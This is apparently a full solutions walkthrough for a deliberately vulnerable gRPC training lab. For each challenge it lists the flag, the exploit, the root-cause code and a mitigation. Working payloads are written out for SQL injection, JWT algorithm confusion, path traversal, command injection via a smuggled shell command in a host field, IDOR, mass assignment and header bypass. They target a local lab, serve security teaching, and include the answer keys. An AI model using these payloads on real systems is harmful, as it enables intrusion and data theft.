# 🗝️  Full Solutions Walkthrough

> **Spoiler warning.** This document contains complete exploits and flags
> for every challenge. If you want to learn by doing, work through
> [`challenges/`](../challenges/) first and come back when you're stuck.

Every challenge has:

- **Recon** — how to discover the attack surface
- **Exploit** — a copy-pasteable payload
- **Automated exploit** — the matching script in `client/exploits/`
- **Root cause** — the buggy code
- **Real-world mitigation** — how to fix it properly in production

---

## Challenge 01 — Server Reflection

**Flag:** `FLAG{r3fl3ct10n_3xp0s3s_4ll_s3rv1c3s}`

### Recon
```bash
grpcurl -plaintext localhost:50051 list
grpcurl -plaintext localhost:50051 describe dvgrpc.AdminService
```
### Exploit
```bash
grpcurl -plaintext -d '{"challenge":"reflection"}' \
  localhost:50051 dvgrpc.AdminService/GetFlag
```
### Automated
```bash
python client/exploits/exploit_01_reflection.py
```
### Root cause
`reflection.enable_server_reflection(...)` is called on the server. It
exposes every service, RPC, and message to any caller.
### Mitigation
- Disable reflection in production (`google.protobuf.Any` message lookups
  can almost always be handled via a static `FileDescriptorSet`).
- If you must keep it on, gate it behind an auth interceptor (mTLS or
  token-based).

---

## Challenge 02 — Unauthenticated Admin

**Flag:** `FLAG{unauth_4dm1n_n0_t0k3n_n33d3d}`

### Exploit
```bash
grpcurl -plaintext -d '{"challenge":"unauthenticated_admin"}' \
  localhost:50051 dvgrpc.AdminService/GetFlag

grpcurl -plaintext localhost:50051 dvgrpc.AdminService/GetSystemInfo
grpcurl -plaintext localhost:50051 dvgrpc.AdminService/ListAllFlags
```
### Root cause
`AuthInterceptor.intercept_service` has an explicit early-return for
`"/dvgrpc.AdminService/"`. Classic "oops, forgot to remove the debug bypass".
### Mitigation
- Authenticate every RPC by default — *deny-by-default*.
- Maintain a PUBLIC_METHODS allowlist, never a DENYLIST.
- Add integration tests that call admin endpoints without a token and
  expect `UNAUTHENTICATED`.

---

## Challenge 03 — SQL Injection

**Flag:** `FLAG{sql_1nj3ct10n_1n_grpc_4p1_f13ld}`

### Exploit
```bash
grpcurl -plaintext -d '{
  "query": "xxxx'\'' UNION SELECT id,flag,challenge,1.0,'\'''\'' FROM flags --"
}' localhost:50051 dvgrpc.ProductService/SearchProducts
```
### Root cause
```python
cursor.execute(f"SELECT ... FROM products WHERE name LIKE '%{q}%'")
```
### Mitigation
- Use parameterised queries (`cursor.execute(sql, (q,))`) — always.
- Never return the raw query to the client (the `debug_query` field).
- Add a SAST rule that fails CI on any `f"... {var} ..."` going into a
  `.execute(...)` call.

---

## Challenge 04 — JWT Algorithm Confusion

**Flag:** `FLAG{jwt_4lg0r1thm_c0nfus10n_pwn3d}`

### Exploit
```python
import jwt, grpc
from generated import auth_pb2, auth_pb2_grpc

ch  = grpc.insecure_channel("localhost:50051")
pub = auth_pb2_grpc.AuthServiceStub(ch).GetPublicKey(auth_pb2.GetPublicKeyRequest()).public_key

forged = jwt.encode(
    {"user_id": 1, "username": "admin", "role": "admin"},
    pub, algorithm="HS256",
)
print("Bearer", forged)
```
### Root cause
The token verification falls back to `pyjwt.decode(token, pub, algorithms=["HS256"])`
when both HS256/app-secret and RS256/public-key fail. The attacker picks the
algorithm the server tries, so signing with the public key as an HMAC
secret produces a "valid" token.

### Mitigation
- Pin `algorithms=["RS256"]` — never accept HS256 when you have an
  asymmetric key pair.
- Use `jwt.decode(token, pub, algorithms=["RS256"])` with no fallbacks.
- Keep the public key out of the API. If a JWKS endpoint is required,
  sign the JWKS itself.

---

## Challenge 05 — IDOR

**Flag:** `FLAG{1ns3cur3_d1r3ct_0bj3ct_r3f3r3nc3}`

### Exploit
```bash
token=$(grpcurl -plaintext -d '{"username":"alice","password":"alice123"}' \
  localhost:50051 dvgrpc.AuthService/Login | jq -r .token)

grpcurl -plaintext -H "authorization: Bearer $token" \
  -d '{"user_id": 1}' localhost:50051 dvgrpc.UserService/GetProfile
```
### Root cause
`UserService.GetProfile` fetches `user_id` from the request without
comparing it against `jwt.user_id`.
### Mitigation
- Enforce ownership at the service layer: `if req.user_id != token.user_id: abort`.
- Use opaque identifiers (UUIDs) to make enumeration harder *as defence in
  depth* — but never as the primary control.

---

## Challenge 06 — Path Traversal

**Flag:** `FLAG{p4th_tr4v3rs4l_gr0und_z3r0_4pp}`

### Exploit
```bash
grpcurl -plaintext -H "authorization: Bearer $token" \
  -d '{"filename":"../secret/path_flag.txt"}' \
  localhost:50051 dvgrpc.FileService/ReadFile
```
### Root cause
```python
path = os.path.join(FILE_BASE_DIR, req.filename)
return open(path).read()
```
`os.path.join` happily walks out of `FILE_BASE_DIR`.

### Mitigation
```python
resolved = (Path(FILE_BASE_DIR) / req.filename).resolve()
if FILE_BASE_DIR not in resolved.parents:
    context.abort(grpc.StatusCode.PERMISSION_DENIED, "nope")
```
- Allowlist filenames (no `/`, no `..`).
- Run file-reading services in a sandboxed container with the uploads dir
  mounted read-only.

---

## Challenge 07 — Command Injection

**Flag:** `FLAG{c0mm4nd_1nj3ct10n_v14_grpc_p1ng}`

### Exploit
```bash
grpcurl -plaintext -H "authorization: Bearer $token" \
  -d '{"host":"127.0.0.1; cat /app/secret/cmd_flag.txt","count":1}' \
  localhost:50051 dvgrpc.CommandService/Ping
```
### Root cause
```python
subprocess.check_output(f"ping -c {n} {host}", shell=True)
```
### Mitigation
- Never pass user input through a shell. Use `subprocess.run([...], shell=False)`.
- Validate `host` against a strict regex (`^[a-zA-Z0-9.-]+$`).
- If the functionality is security-sensitive, don't expose it at all.

---

## Challenge 08 — Mass Assignment

**Flag:** `FLAG{m4ss_4ss1gnm3nt_r0l3_3sc4l4t10n}`

### Exploit
```bash
grpcurl -plaintext -d '{
  "username":"shadow","password":"root","email":"e@e","role":"admin"
}' localhost:50051 dvgrpc.AuthService/Register
```
### Root cause
`AuthService.Register` takes the `role` field directly from the proto
message and writes it to the database.
### Mitigation
- Never trust client-supplied role/permission fields. Hardcode to `"user"`.
- Use *separate* messages for internal vs external API — public proto
  should not even contain the `role` field.

---

## Challenge 09 — Metadata Bypass

**Flag:** `FLAG{m3t4d4t4_byp4ss_l1k3_4_pr0}`

### Exploit
```bash
grpcurl -plaintext \
  -H "x-internal-service: dvgrpc-internal-v1" \
  localhost:50051 dvgrpc.UserService/ListUsers
```
### Root cause
The interceptor contains:
```python
if metadata.get("x-internal-service") == "dvgrpc-internal-v1":
    return continuation(...)
```
### Mitigation
- Never trust a client-supplied header for authentication. If you
  genuinely need a "service-to-service" mode, use mTLS with an OU check.
- Audit your interceptors for bypasses *before every release*.

---

## Challenge 10 — Hardcoded Credentials

**Flag:** `FLAG{h4rdc0d3d_s3cr3ts_4r3_b4d_pr4ct1c3}`

### Exploit
```bash
grpcurl -plaintext -d '{"username":"admin","password":"admin123"}' \
  localhost:50051 dvgrpc.AuthService/Login
```
### Root cause
`server/config.py` ships with `ADMIN_PASSWORD = "admin123"`.
### Mitigation
- Load secrets from environment variables / a secret manager.
- Enforce password complexity for admin accounts.
- Scan every commit with `trufflehog` / `gitleaks`.

---

## Bonus 1 — ECB Block Leakage

**Flag:** `FLAG{3cb_m0d3_l3aks_p4tt3rns_b4d}`

### Exploit
```python
from generated import crypto_pb2, crypto_pb2_grpc
import grpc, binascii

ch = grpc.insecure_channel("localhost:50051")
stub = crypto_pb2_grpc.CryptoServiceStub(ch)
resp = stub.Encrypt(crypto_pb2.EncryptRequest(
    plaintext="A" * 32, algorithm="AES-ECB"))
ct = bytes.fromhex(resp.ciphertext_hex)
assert ct[:16] == ct[16:32]          # identical blocks → ECB confirmed
```
### Root cause
`AES.new(key, AES.MODE_ECB)` — identical plaintext blocks produce
identical ciphertext blocks.
### Mitigation
- Use authenticated encryption: AES-GCM with a unique random nonce per
  message.
- Never use ECB. Ever.

---

## Bonus 2 — HMAC Forgery

**Flag:** `FLAG{s1gn4tur3_f0rg3d_w34k_hmac}`

See [`challenges/bonus-crypto/README.md`](../challenges/bonus-crypto/) for
the full hash-length-extension walkthrough.

---

## Challenge 11 — Timing Attack (username enumeration)

**Flag:** `FLAG{t1m1ng_4tt4ck_us3r_3num3r4t10n}`

See [`challenges/11-timing-attack/README.md`](../challenges/11-timing-attack/).

---

## Challenge 12 — Streaming DoS

**Flag:** `FLAG{unb0und3d_str34m_3xh4usts_th3_s3rv3r}`

See [`challenges/12-streaming-dos/README.md`](../challenges/12-streaming-dos/).
